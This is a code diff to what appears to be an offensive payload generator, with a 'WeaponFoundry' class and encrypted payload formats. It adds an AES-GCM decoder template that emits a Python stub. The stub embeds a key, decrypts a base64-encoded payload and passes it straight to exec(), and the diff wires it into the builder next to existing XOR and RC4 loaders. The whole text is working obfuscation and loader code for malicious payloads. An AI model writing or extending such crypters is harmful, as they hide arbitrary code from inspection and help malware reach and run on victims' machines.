@@ -166,19 +166,6 @@ class EncryptionEngine:
         return bytes(result)
     
     @staticmethod
-    def aes_encrypt(data: bytes, key: bytes, iv: Optional[bytes] = None) -> Tuple[bytes, bytes]:
-        """
-        AES-256-CBC encryption.
-        
-        Args:
-            data: Data to encrypt
-            key: 32-byte key (will be derived if shorter)
-            iv: 16-byte IV (random if not provided)
-            
-        Returns:
-            Tuple of (encrypted_data, iv)
-        """
-    @staticmethod
     def aes_encrypt(data: bytes, key: bytes, nonce: Optional[bytes] = None) -> Tuple[bytes, bytes, bytes]:
         """
         AES-256-GCM encryption (Strategic Hardened Upgrade).
@@ -444,6 +431,30 @@ exec(_rc4(_p,_k))
 '''
     
     @staticmethod
+    def get_aes_decoder_python(key: bytes) -> str:
+        """Generate Python AES-GCM decoder"""
+        key_hex = key.hex()
+        return f'''
+import base64, hashlib
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    # Recovery attempt: If pycryptodome is missing, this payload is dead weight
+    # but we log it as a hint for the operator.
+    print("[-] Error: pycryptodome required for AES payload execution")
+    import sys; sys.exit(1)
+
+_k=bytes.fromhex("{key_hex}")
+if len(_k)<32: _k=hashlib.sha256(_k).digest()
+_p=base64.b64decode(_e)
+_n=_p[:12]
+_t=_p[12:28]
+_c=_p[28:]
+_ci=AES.new(_k, AES.MODE_GCM, nonce=_n)
+exec(_ci.decrypt_and_verify(_c, _t))
+'''
+
+    @staticmethod
     def get_xor_decoder_powershell(key: bytes) -> str:
         """Generate PowerShell XOR decoder"""
         key_int = key[0]
@@ -622,6 +633,8 @@ class WeaponFoundry:
                 return self.decoder.get_xor_decoder_python(key)
             elif encryption == EncryptionMethod.RC4:
                 return self.decoder.get_rc4_decoder_python(key)
+            elif encryption == EncryptionMethod.AES:
+                return self.decoder.get_aes_decoder_python(key)
         
         elif format == PayloadFormat.POWERSHELL:
             if encryption == EncryptionMethod.XOR:
